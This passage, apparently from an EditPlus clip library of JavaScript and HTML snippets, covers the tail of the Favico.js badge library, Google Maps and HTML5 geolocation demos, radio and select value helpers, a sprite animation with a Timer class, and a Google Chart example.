            if (_opt.position === 'up') {
                for (var i = 0; i < animation.types['' + _opt.animation].length; i++) {
                    var step = animation.types['' + _opt.animation][i];
                    if (step.y < 0.6) {
                        step.y = step.y - 0.4;
                    } else {
                        step.y = step.y - 2 * step.y + (1 - step.w);
                    }
                    animation.types['' + _opt.animation][i] = step;
                }
            }
            _opt.type = (type['' + _opt.type]) ? _opt.type : _def.type;
            try {
                _orig = link.getIcon();
                //create temp canvas
                _canvas = document.createElement('canvas');
                //create temp image
                _img = document.createElement('img');
                if (_orig.hasAttribute('href')) {
                    _img.setAttribute('src', _orig.getAttribute('href'));
                    //get width/height
                    _img.onload = function() {
                        _h = (_img.height > 0) ? _img.height : 32;
                        _w = (_img.width > 0) ? _img.width : 32;
                        _canvas.height = _h;
                        _canvas.width = _w;
                        _context = _canvas.getContext('2d');
                        icon.ready();
                    };
                } else {
                    _canvas.height = 32;
                    _canvas.width = 32;
                    _context = _canvas.getContext('2d');
                    icon.ready();
                }
            } catch(e) {
                throw 'Error initializing favico. Message: ' + e.message;
            }

        };
        /**
         * Icon namespace
         */
        var icon = {};
        /**
         * Icon is ready (reset icon) and start animation (if ther is any)
         */
        icon.ready = function() {
            _ready = true;
            icon.reset();
            _readyCb();
        };
        /**
         * Reset icon to default state
         */
        icon.reset = function() {
            //reset
            _queue = [];
            _lastBadge = false;
            _context.clearRect(0, 0, _w, _h);
            _context.drawImage(_img, 0, 0, _w, _h);
            //_stop=true;
            link.setIcon(_canvas);
            //webcam('stop');
            //video('stop');
        };
        /**
         * Start animation
         */
        icon.start = function() {
            if (!_ready || _running) {
                return;
            }
            var finished = function() {
                _lastBadge = _queue[0];
                _running = false;
                if (_queue.length > 0) {
                    _queue.shift();
                    icon.start();
                } else {

                }
            };
            if (_queue.length > 0) {
                _running = true;
                if (_lastBadge) {
                    animation.run(_lastBadge.options, function() {
                        animation.run(_queue[0].options, function() {
                            finished();
                        }, false);
                    }, true);
                } else {
                    animation.run(_queue[0].options, function() {
                        finished();
                    }, false);
                }
            }
        };

        /**
         * Badge types
         */
        var type = {};
        var options = function(opt) {
            opt.n = Math.abs(opt.n);
            opt.x = _w * opt.x;
            opt.y = _h * opt.y;
            opt.w = _w * opt.w;
            opt.h = _h * opt.h;
            return opt;
        };
        /**
         * Generate circle
         * @param {Object} opt Badge options
         */
        type.circle = function(opt) {
            opt = options(opt);
            var more = (opt.n > 9 && opt.n < 100);
            if (more) {
                opt.x = opt.x - opt.w * 0.4;
                opt.w = opt.w * 1.4;
            }
            _context.clearRect(0, 0, _w, _h);
            _context.drawImage(_img, 0, 0, _w, _h);
            _context.beginPath();
            _context.font = _opt.fontStyle + " " + Math.floor(opt.h) + "px " + _opt.fontFamily;
            _context.textAlign = 'center';
            if (more) {
                _context.moveTo(opt.x + opt.w / 2, opt.y);
                _context.lineTo(opt.x + opt.w - opt.h / 2, opt.y);
                _context.quadraticCurveTo(opt.x + opt.w, opt.y, opt.x + opt.w, opt.y + opt.h / 2);
                _context.lineTo(opt.x + opt.w, opt.y + opt.h - opt.h / 2);
                _context.quadraticCurveTo(opt.x + opt.w, opt.y + opt.h, opt.x + opt.w - opt.h / 2, opt.y + opt.h);
                _context.lineTo(opt.x + opt.h / 2, opt.y + opt.h);
                _context.quadraticCurveTo(opt.x, opt.y + opt.h, opt.x, opt.y + opt.h - opt.h / 2);
                _context.lineTo(opt.x, opt.y + opt.h / 2);
                _context.quadraticCurveTo(opt.x, opt.y, opt.x + opt.h / 2, opt.y);
            } else {
                _context.arc(opt.x + opt.w / 2, opt.y + opt.h / 2, opt.h / 2, 0, 2 * Math.PI);
            }
            _context.fillStyle = 'rgba(' + _opt.bgColor.r + ',' + _opt.bgColor.g + ',' + _opt.bgColor.b + ',' + opt.o + ')';
            _context.fill();
            _context.closePath();
            _context.beginPath();
            _context.stroke();
            _context.fillStyle = 'rgba(' + _opt.textColor.r + ',' + _opt.textColor.g + ',' + _opt.textColor.b + ',' + opt.o + ')';
            //_context.fillText((more) ? '9+' : opt.n, Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            if (opt.n > 99) {
                _context.fillText('∞', Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            } else {
                _context.fillText(opt.n, Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            }
            _context.closePath();
        };
        /**
         * Generate rectangle
         * @param {Object} opt Badge options
         */
        type.rectangle = function(opt) {
            opt = options(opt);
            var more = (opt.n > 9 && opt.n < 100);
            if (more) {
                opt.x = Math.floor(opt.x - opt.w * 0.4);
                opt.w = Math.floor(opt.w * 1.4);
            }
            _context.clearRect(0, 0, _w, _h);
            _context.drawImage(_img, 0, 0, _w, _h);
            _context.beginPath();
            _context.font = "bold " + Math.floor(opt.h) + "px sans-serif";
            _context.textAlign = 'center';
            _context.fillStyle = 'rgba(' + _opt.bgColor.r + ',' + _opt.bgColor.g + ',' + _opt.bgColor.b + ',' + opt.o + ')';
            _context.fillRect(opt.x, opt.y, opt.w, opt.h);
            _context.fillStyle = 'rgba(' + _opt.textColor.r + ',' + _opt.textColor.g + ',' + _opt.textColor.b + ',' + opt.o + ')';
            //_context.fillText((more) ? '9+' : opt.n, Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            if (opt.n > 99) {
                _context.fillText('∞', Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            } else {
                _context.fillText(opt.n, Math.floor(opt.x + opt.w / 2), Math.floor(opt.y + opt.h - opt.h * 0.15));
            }
            _context.closePath();
        };

        /**
         * Set badge
         */
        var badge = function(number, animType) {
            _readyCb = function() {
                try {
                    if (number > 0) {
                        if (animation.types['' + animType]) {
                            _opt.animation = animType;
                        }
                        _queue.push({
                            type : 'badge',
                            options : {
                                n : number
                            }
                        });
                        if (_queue.length > 100) {
                            throw 'Too many badges requests in queue...';
                        }
                        icon.start();
                    } else {
                        icon.reset();
                    }
                } catch(e) {
                    throw 'Error setting badge. Message: ' + e.message;
                }
            };
            if (_ready) {
                _readyCb();
            }
        };

        /**
         * Set image as icon
         */
        var image = function(imageElement) {
            _readyCb = function() {
                try {
                    var w = imageElement.width;
                    var h = imageElement.height;
                    var newImg = document.createElement('img');
                    var ratio = (w / _w < h / _h) ? (w / _w) : (h / _h);
                    newImg.setAttribute('src', imageElement.getAttribute('src'));
                    newImg.height = (h / ratio);
                    newImg.width = (w / ratio);
                    _context.clearRect(0, 0, _w, _h);
                    _context.drawImage(newImg, 0, 0, _w, _h);
                    link.setIcon(_canvas);
                } catch(e) {
                    throw 'Error setting image...';
                }
            };
            if (_ready) {
                _readyCb();
            }
        };
        /**
         * Set video as icon
         */
        var video = function(videoElement) {
            _readyCb = function() {
                try {
                    if (videoElement === 'stop') {
                        _stop = true;
                        icon.reset();
                        _stop = false;
                        return;
                    }
                    //var w = videoElement.width;
                    //var h = videoElement.height;
                    //var ratio = (w / _w < h / _h) ? (w / _w) : (h / _h);
                    videoElement.addEventListener('play', function() {
                        drawVideo(this);
                    }, false);

                } catch(e) {
                    throw 'Error setting video...';
                }
            };
            if (_ready) {
                _readyCb();
            }
        };
        /**
         * Set video as icon
         */
        var webcam = function(action) {
            //UR
            if (!window.URL || !window.URL.createObjectURL) {
                window.URL = window.URL || {};
                window.URL.createObjectURL = function(obj) {
                    return obj;
                };
            }
            if (_browser.supported) {
                var newVideo = false;
                navigator.getUserMedia = navigator.getUserMedia || navigator.oGetUserMedia || navigator.msGetUserMedia || navigator.mozGetUserMedia || navigator.webkitGetUserMedia;
                _readyCb = function() {
                    try {
                        if (action === 'stop') {
                            _stop = true;
                            icon.reset();
                            _stop = false;
                            return;
                        }
                        newVideo = document.createElement('video');
                        newVideo.width = _w;
                        newVideo.height = _h;
                        navigator.getUserMedia({
                            video : true,
                            audio : false
                        }, function(stream) {
                            newVideo.src = URL.createObjectURL(stream);
                            newVideo.play();
                            drawVideo(newVideo);
                        }, function() {
                        });
                    } catch(e) {
                        throw 'Error setting webcam...';
                    }
                };
                if (_ready) {
                    _readyCb();
                }
            }

        };

        /**
         * Draw video to context and repeat :)
         */
        function drawVideo(video) {
            if (video.paused || video.ended || _stop) {
                return false;
            }
            //nasty hack for FF webcam (Thanks to Julian ?wirko, kontakt@redsunmedia.pl)
            try {
                _context.clearRect(0, 0, _w, _h);
                _context.drawImage(video, 0, 0, _w, _h);
            } catch(e) {

            }
            setTimeout(drawVideo, animation.duration, video);
            link.setIcon(_canvas);
        }

        var link = {};
        /**
         * Get icon from HEAD tag or create a new <link> element
         */
        link.getIcon = function() {
            var elm = false;
            //get link element
            var getLink = function() {
                var link = document.getElementsByTagName('head')[0].getElementsByTagName('link');
                for (var l = link.length, i = (l - 1); i >= 0; i--) {
                    if ((/icon/i).test(link[i].getAttribute('rel'))) {
                        return link[i];
                    }
                }
                return false;
            };
            if (_opt.elementId) {
                //if img element identified by elementId
                elm = document.getElementById(_opt.elementId);
                elm.setAttribute('href', elm.getAttribute('src'));
            } else {
                //if link element
                elm = getLink();
                if (elm === false) {
                    elm = document.createElement('link');
                    elm.setAttribute('rel', 'icon');
                    document.getElementsByTagName('head')[0].appendChild(elm);
                }
            }
            elm.setAttribute('type', 'image/png');
            //misspelled "image"
            return elm;
        };
        link.setIcon = function(canvas) {
            var url = canvas.toDataURL('image/png');
            if (_opt.elementId) {
                //if is attached to element (image)
                document.getElementById(_opt.elementId).setAttribute('src', url);
            } else {
                //if is attached to fav icon
                if (_browser.ff || _browser.opera) {
                    //for FF we need to "recreate" element, atach to dom and remove old <link>
                    //var originalType = _orig.getAttribute('rel');
                    var old = _orig;
                    _orig = document.createElement('link');
                    //_orig.setAttribute('rel', originalType);
                    if (_browser.opera) {
                        _orig.setAttribute('rel', 'icon');
                    }
                    _orig.setAttribute('rel', 'icon');
                    _orig.setAttribute('type', 'image/png');
                    document.getElementsByTagName('head')[0].appendChild(_orig);
                    _orig.setAttribute('href', url);
                    if (old.parentNode) {
                        old.parentNode.removeChild(old);
                    }
                } else {
                    _orig.setAttribute('href', url);
                }
            }
        };

        //http://stackoverflow.com/questions/5623838/rgb-to-hex-and-hex-to-rgb#answer-5624139
        //HEX to RGB convertor
        function hexToRgb(hex) {
            var shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
            hex = hex.replace(shorthandRegex, function(m, r, g, b) {
                return r + r + g + g + b + b;
            });
            var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
            return result ? {
                r : parseInt(result[1], 16),
                g : parseInt(result[2], 16),
                b : parseInt(result[3], 16)
            } : false;
        }

        /**
         * Merge options
         */
        function merge(def, opt) {
            var mergedOpt = {};
            var attrname;
            for (attrname in def) {
                mergedOpt[attrname] = def[attrname];
            }
            for (attrname in opt) {
                mergedOpt[attrname] = opt[attrname];
            }
            return mergedOpt;
        }

        /**
         * @namespace animation
         */
        var animation = {};
        /**
         * Animation "frame" duration
         */
        animation.duration = 40;
        /**
         * Animation types (none,fade,pop,slide)
         */
        animation.types = {};
        animation.types.fade = [{
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.0
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.1
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.2
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.3
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.4
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.5
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.6
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.7
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.8
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 0.9
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 1.0
        }];
        animation.types.none = [{
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 1
        }];
        animation.types.pop = [{
            x : 1,
            y : 1,
            w : 0,
            h : 0,
            o : 1
        }, {
            x : 0.9,
            y : 0.9,
            w : 0.1,
            h : 0.1,
            o : 1
        }, {
            x : 0.8,
            y : 0.8,
            w : 0.2,
            h : 0.2,
            o : 1
        }, {
            x : 0.7,
            y : 0.7,
            w : 0.3,
            h : 0.3,
            o : 1
        }, {
            x : 0.6,
            y : 0.6,
            w : 0.4,
            h : 0.4,
            o : 1
        }, {
            x : 0.5,
            y : 0.5,
            w : 0.5,
            h : 0.5,
            o : 1
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 1
        }];
        animation.types.popFade = [{
            x : 0.75,
            y : 0.75,
            w : 0,
            h : 0,
            o : 0
        }, {
            x : 0.65,
            y : 0.65,
            w : 0.1,
            h : 0.1,
            o : 0.2
        }, {
            x : 0.6,
            y : 0.6,
            w : 0.2,
            h : 0.2,
            o : 0.4
        }, {
            x : 0.55,
            y : 0.55,
            w : 0.3,
            h : 0.3,
            o : 0.6
        }, {
            x : 0.50,
            y : 0.50,
            w : 0.4,
            h : 0.4,
            o : 0.8
        }, {
            x : 0.45,
            y : 0.45,
            w : 0.5,
            h : 0.5,
            o : 0.9
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 1
        }];
        animation.types.slide = [{
            x : 0.4,
            y : 1,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.9,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.9,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.8,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.7,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.6,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.5,
            w : 0.6,
            h : 0.6,
            o : 1
        }, {
            x : 0.4,
            y : 0.4,
            w : 0.6,
            h : 0.6,
            o : 1
        }];
        /**
         * Run animation
         * @param {Object} opt Animation options
         * @param {Object} cb Callabak after all steps are done
         * @param {Object} revert Reverse order? true|false
         * @param {Object} step Optional step number (frame bumber)
         */
        animation.run = function(opt, cb, revert, step) {
            var animationType = animation.types[_opt.animation];
            if (revert === true) {
                step = ( typeof step !== 'undefined') ? step : animationType.length - 1;
            } else {
                step = ( typeof step !== 'undefined') ? step : 0;
            }
            cb = (cb) ? cb : function() {
            };
            if ((step < animationType.length) && (step >= 0)) {
                type[_opt.type](merge(opt, animationType[step]));
                setTimeout(function() {
                    if (revert) {
                        step = step - 1;
                    } else {
                        step = step + 1;
                    }
                    animation.run(opt, cb, revert, step);
                }, animation.duration);

                link.setIcon(_canvas);
            } else {
                cb();
                return;
            }
        };
        //auto init
        init();
        return {
            badge : badge,
            video : video,
            image : image,
            webcam : webcam,
            reset : icon.reset
        };
    });

    // AMD / RequireJS
    if ( typeof define !== 'undefined' && define.amd) {
        define([], function() {
            return Favico;
        });
    }
    // CommonJS
    else if ( typeof module !== 'undefined' && module.exports) {
        module.exports = Favico;
    }
    // included directly via <script> tag
    else {
        this.Favico = Favico;
    }

})();

#T=geo google
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
	<script type="text/javascript" src="http://code.hs-cn.com/jquery/jquery-1.7.min.js"></script>
</head>
<body>
<input id="txt_address" class="input_css" type="text" value="Where Are You ?"/>
<div id="map_canvas"></div>
</body>
<script language="javascript" type="text/javascript">
	var map, marker,
	//实例化地址解析器
	geoCoder = new google.maps.Geocoder(),
	//初始化地图的配置
	myOptions = {
		zoom: 15,
		center: new google.maps.LatLng(113.32152399999995, 23.134685),
		mapTypeId: google.maps.MapTypeId.ROADMAP
	};
	function GetGeoCoder() {
		var searchAddress = $("#txt_address").val();
		geoCoder.geocode({
			'address': searchAddress
		},
		function(results, state) {
			if (state = google.maps.GeocoderStatus.OK) {
				if (results[0]) {
					var point = results[0].geometry.location;
					if (marker) {
						marker.setMap(null);
					}
					marker = new google.maps.Marker({
						map: map,
						position: point
					});
					var infowindow = new google.maps.InfoWindow({
						content: '<h3>我在这里.</h3>' + results[0].formatted_address
					});
					google.maps.event.addListener(marker, 'click',
					function() {
						infowindow.open(map, marker);
					});
					map.setCenter(point);
				}
			}
		})
	}
	//利用html5的geolocation来获取当前位置
	function GetGeoLocation() {
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(function(position) {
				var pos = new google.maps.LatLng(position.coords.latitude, position.coords.longitude);
				console.log(position);
				geoCoder.geocode({
					'latLng': pos
				},
				function(results, state) {
					if (state = google.maps.GeocoderStatus.OK) {
						if (results[0]) {
							var point = results[0].geometry.location;
							var myDirection = results[0].formatted_address;
							if (marker) {
								marker.setMap(null);
							}
							marker = new google.maps.Marker({
								map: map,
								position: point
							});
							var infowindow = new google.maps.InfoWindow({
								content: '<h3>我在这里</h3>' + myDirection
							});
							google.maps.event.addListener(marker, 'click',
							function() {
								infowindow.open(map, marker);
							});
							map.setCenter(point);
							$("#txt_address").val(myDirection.split(' ')[0]);
						}
					}
				})
			},
			function() {
				handleNoGeolocation(true);
			},
			{
				'enableHighAccuracy': true,
				'timeout': 10000,
				'maximumAge': 0
			});
		} else {
			// 浏览器不支持Geolocation
			handleNoGeolocation(false);
		}
	}
	function handleNoGeolocation(errorFlag) {
		if (errorFlag) {
			var content = 'Error: The Geolocation service failed.';
		} else {
			var content = 'Error: Your browser doesn\'t support geolocation.';
		}
		var options = {
			map: map,
			position: new google.maps.LatLng(113.32152399999995, 23.134685),
			content: content
		};
		var infowindow = new google.maps.InfoWindow(options);
		map.setCenter(options.position);
	}
	$(function() {
		map = new google.maps.Map(document.getElementById('map_canvas'), myOptions);
		//页面加载时，利用html5获取当前位置
		GetGeoLocation();
		$('#txt_address').bind('keyup',
		function(event) {
			if (event.keyCode == 13) {
				GetGeoCoder();
			}
		});
	});
 </script>
</html>

#T=geolocation HTML5 定位
javascript:navigator.geolocation.getCurrentPosition(function(position){alert(position.coords.latitude+"\n"+position.coords.longitude);},function(err){alert(err.code)});


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<script type="text/javascript">
<!--
if (navigator.geolocation)
{
	navigator.geolocation.getCurrentPosition
		(
			function(position)
			{
				alert(position.coords.latitude + "\n" + position.coords.longitude);
			}
			, function(err)
			{
				alert(err.code);
			}
		);
}
else
{
	alert('sorry');
}
//-->
</script>
</body>
</html>


#T=Get Radio Select Value
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Use JavaScript to get radio and select value</title>
<script type="text/javascript">
var JS =
	{
		//我喜欢把一些相关的方法写到一个静态JS对象里 我认为这样会使VS得智能感知对我们比较友善
		//如果对封装不明白的 请看 这里
		IsNullOrEmpty : function(str)
						{
							//这是一个工具方法，用来判断一个字符串是否未定义，或为空，或为空字符串
							if(typeof(str)=="undefined")
							{
								return true;   //这具如果有疑问的话 可以看我下面的说明 
							}
							if (str==null)
							{
								return true;
							}
							if (str=="")
							{
								return true;
							}
							return false;
						}
		,//IsNullOrEmpty
		GetRadioValue : function(radioName)
						//获得单选框当前选中的值的方法，
						//为了方便以后使用 所以我把 单选框的Name属性作为了一个参数
						{
							var radios = document.getElementsByName(radioName);
							//这里我们用 getElementsByName 来获得所有的单选框，因为单选框一般都是2个或2个以上为一组出现的
							for (var i = 0 ; i< radios.length; i++)//遍历丫的。。。
							{
								var radio = radios.item(i);//这里也可以写成 var radio = radios[i]
								//但是我在下面提出了一个疑问 希望高手解答
								if (radio.checked)
								{
									if (JS.IsNullOrEmpty(radio.value))
									{
										return undefined;
									}//无论当前选中的值是 未定义 还是空 还是空字符串
									//我都把他们的返回值统一设置为 undefined
									//我觉得这样做的话，以后使用这个方法的时候比较方便
									return radio.value;
								}
							}
							return undefined;//最后 如果没有任何一个单选框被选中的话 返回 undefined
						}
						,//GetRadioValue
		GetSelectValue : function(selectId)//获得下拉列表当前选中的值的方法，
											//为了方便以后使用 所以我把 下拉列表的ID属性作为了一个参数
						{
							var select = document.getElementById(selectId);
							var options = select.options;//这样可以让我们获得该下拉列表的所有选项
							for (var i = 0 ; i<options.length; i++) //依然遍历丫的
																	//之后做的基本和前一个方法一样了
																	//注意 radio的是否选中 是checked属性 select则是 selected属性
							{
								var option = options[i];
								if (option.selected)
								{
									if (JS.IsNullOrEmpty(option.value))
									{
										return undefined;
									}
									return option.value;
								}
							}
							return undefined;
						}//GetSelectValue
	}
</script>
</head>
<body>
<fieldset>
	<legend>Get Radio Value</legend>
	<input name="Radio" type="radio" value="male" />Male
	<input name="Radio" type="radio" value="female" />Female
	<input name="GetRadioValue" type="button" onclick="alert(JS.GetRadioValue('Radio'));" value="Get radio value" />
</fieldset>
<fieldset>
	<legend>Get Select Value</legend>
		<select id="Select" name="Select">
			<option>Select a number</option>
			<option value="0">0</option>
			<option value="1">1</option>
			<option value="2">2</option>
		</select>
<input name="GetSelectValue" type="button" onclick="alert(JS.GetSelectValue('Select'))" value="Get select value" />
</fieldset>
</body>
</html>
#T=Google Animation
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> google ani </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
 </head>
	<style type="text/css">
		.animator_containter{
			margin: 0.5em auto; 
			background: transparent url(ani.png) no-repeat scroll 0px 0px ; 
			width: 52px; 
			height: 37px; 
			cursor: pointer; 
			-moz-background-clip: -moz-initial; 
			-moz-background-origin: -moz-initial; 
			-moz-background-inline-policy: -moz-initial;
		}
		
	</style>
<!-- 	<script type="text/javascript" src="common.js"></script>
	<script type="text/javascript" src="timer.js"></script> -->

<script type="text/javascript" language="javascript">
/**
 * @author wjjin
 */

if (typeof(geekeesjs) == "undefined")
			_geekees = geekeesjs = {};

function $() {
	var elements = new Array();
	for (var i = 0; i < arguments.length; i++) {
		var element = arguments[i];
		if (typeof element == 'string')
			element = document.getElementById(element);
		if (arguments.length == 1)
			return element;
		elements.push(element);
	}
	return elements;
}
</script>

<script type="text/javascript" language="javascript">
/**
 * @author wjjin
 */
//Updated 4/18/2003: Footprint decreased, minor code improvements.
//Updated 5/3/2003: Minor comment clarification; no code changes.
//Updated 5/10/2003: Minor code improvements.
// The constructor should be called with
// the parent object (optional, defaults to window).

function Timer(){
	this.obj = (arguments.length)?arguments[0]:window;
	return this;
}

// The set functions should be called with:
// - The name of the object method (as a string) (required)
// - The millisecond delay (required)
// - Any number of extra arguments, which will all be
// passed to the method when it is evaluated.

Timer.prototype.setInterval = function(func, msec){
	var i = Timer.getNew();
	var t = Timer.buildCall(this.obj, i, arguments);
	Timer.set[i].timer = window.setInterval(t,msec);
	return i;
	}
	Timer.prototype.setTimeout = function(func, msec){
	var i = Timer.getNew();
	Timer.buildCall(this.obj, i, arguments);
	Timer.set[i].timer = window.setTimeout("Timer.callOnce("+i+");",msec);
	return i;
}

// The clear functions should be called with
// the return value from the equivalent set function.

Timer.prototype.clearInterval = function(i){
	if(!Timer.set[i]) return;
	window.clearInterval(Timer.set[i].timer);
	Timer.set[i] = null;
	}
	Timer.prototype.clearTimeout = function(i){
	if(!Timer.set[i]) return;
	window.clearTimeout(Timer.set[i].timer);
	Timer.set[i] = null;
}

// Private data

Timer.set = new Array();
Timer.buildCall = function(obj, i, args){
	var t = "";
	Timer.set[i] = new Array();
	if(obj != window){
		Timer.set[i].obj = obj;
		t = "Timer.set["+i+"].obj.";
	}
	t += args[0]+"(";
	if(args.length > 2){
		Timer.set[i][0] = args[2];
		t += "Timer.set["+i+"][0]";
		for(var j=1; (j+2)<args.length; j++){
			Timer.set[i][j] = args[j+2];
			t += ", Timer.set["+i+"]["+j+"]";
		}
	}
	t += ");";
	Timer.set[i].call = t;
	return t;
}

Timer.callOnce = function(i){
	if(!Timer.set[i]) return;
	eval(Timer.set[i].call);
	Timer.set[i] = null;
}
Timer.getNew = function(){
	var i = 0;
	while(Timer.set[i]) i++;
	return i;
}


//Here's an example of the code in action:
//function Ticker(){
//this.count = 0;
//this.timer = new Timer(this);
//}
//Ticker.prototype.tick = function(d){
//this.count+=d;
//window.status = ""+this.count;
//this.timer.setTimeout("tick", 1000, d);
//}

//window.onload = function(){
//var ticker = new Ticker();
//ticker.tick(1);
//}
</script>

 <body>
	
	<div id="divAni" class="animator_containter" onmouseover="go();return false;" onmouseout="back();return false;">
		
	</div>
	
	<script type="text/javascript">
		//***************************Class _geekees.Animator********************************
		
		//initialize
		if (typeof(_geekees.Animator) == "undefined")
			_geekees.Animator = {};
		else
			alert("Animator is already set!");
	
		//constructor
		_geekees.Animator = function( containerId
										, width
										, height
										, initialPosX
										, initialPosY
										, motionTime
										, stepX
										, stepY ){
					
			this.container = $( containerId );
			this.container.style.width = width + "px";
			this.container.style.height = height + "px";
			this.container.style.backgroundPosition = initialPosX + "px " + initialPosY + "px";
			this.startPosX = 0;
			this.startPosY = 0;
			this.endPosX = 0;
			this.endPosY = 0;
			this.isForwardX = true;
			this.isForwardY = true;
			this.motionTime = motionTime;
			this.timer = new Timer( this );//initial the Timer class
			this.stepX = stepX;//each time moving step
			this.stepY = stepY;
		}
		
		//move method
		_geekees.Animator.prototype.move = function(){
			
			if (this.isForwardX) {
				if (this.startPosX < this.endPosX) {
					this.timer.setTimeout('move', this.motionTime);
					this.startPosX += this.stepX;
				}
			}
			else {
				if (this.startPosX > this.endPosX) {
					this.timer.setTimeout('move', this.motionTime);
					this.startPosX -= this.stepX;
				}
			}
			
			if (this.isForwardY) {
				if (this.startPosY < this.endPosY) {
					this.timer.setTimeout('move', this.motionTime);
					this.startPosY += this.stepY;
				}
			}
			else {
				if (this.startPosY > this.endPosY) {
					this.timer.setTimeout('move', this.motionTime);
					this.startPosY -= this.stepY;
				}
			}
			
			//set the container status
			this.container.style.backgroundPosition = this.startPosX + "px " + this.startPosY + "px";
			
		}
		
		//the method which to be called
		_geekees.Animator.prototype.animate = function( startX, endX, startY, endY ){
			this.startPosX = startX;
			this.endPosX = endX;
			this.startPosY = startY;
			this.endPosY = endY;
			
			this.isForwardX = startX <= endX;//determine whether start position is larger than end position
			this.isForwardY = startY <= endY;
						
			this.move();
		}
		//***************************End of Class _geekees.Animator********************************
		
		
		
		
		/******************test*******************/
		function go(){
			ani.animate( 0, -208, 0,  0 );
		}
		
		function back(){
			ani.animate( -208, 0,  0,  0 );
		}
		
		var ani = new _geekees.Animator( 'divAni', 52, 37, 0, 0,  100 ,52, 0);
	</script>
 </body>
</html>

#T=Google Chart API
<html>
<head>
	<script type="text/javascript" src="https://www.google.com/jsapi"></script>
	<script type="text/javascript">
		google.load
				(
					"visualization",
					"1",
					{
						packages : ["corechart"]
					}
				);
		google.setOnLoadCallback(drawChart);
		function drawChart()
		{
			var data = new google.visualization.DataTable();
			data.addColumn('string', 'Year');
			data.addColumn('number', 'Sales');
			data.addColumn('number', 'Expenses');
			data.addRows(4);
			data.setValue(0, 0, '2004');
			data.setValue(0, 1, 1000);
			data.setValue(0, 2, 400);
			data.setValue(1, 0, '2005');
			data.setValue(1, 1, 1170);
			data.setValue(1, 2, 460);
			data.setValue(2, 0, '2006');
			data.setValue(2, 1, 660);
			data.setValue(2, 2, 1120);
			data.setValue(3, 0, '2007');
			data.setValue(3, 1, 1030);
			data.setValue(3, 2, 540);
			var chart = new google.visualization.ColumnChart(document.getElementById('chart_div'));
			chart.draw
					(
						data,
						{
							width : 400,
							height : 240,
							title : 'Company Performance',
							hAxis :
								{
									title: 'Year',
									titleTextStyle :
										{
											color : 'red'
										}
								}
						}
					);
		}
	</script>
</head>
<body>
	<div id="chart_div"></div>
</body>
</html>
#T=Google Module
<!-- outer module begin -->
<div id=m_00X class=modbox style="position:relative">
<!-- inner module Begin -->
	<TABLE border="1" width="100%">
		<TR>
			<TD>
				<h2 class=modtitle>
					<table class=mhdr border="1">
						<tr>
							<td id=m_00X_h class=mttl>
								<a>
									No Title
								</a>
							</td>
							<td id=m_00X_e class=medit>
